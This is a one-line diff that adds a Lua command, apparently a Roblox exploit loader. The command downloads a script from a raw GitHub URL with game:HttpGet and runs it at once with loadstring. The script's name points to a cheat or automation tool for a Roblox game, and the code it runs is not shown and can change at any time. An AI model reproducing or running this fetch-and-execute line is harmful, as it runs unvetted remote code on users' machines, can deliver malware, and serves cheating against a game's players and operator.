@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/1-hour-crazy-skeleton-rng-spam2-qqiw80mvmk70ss.lua"))()
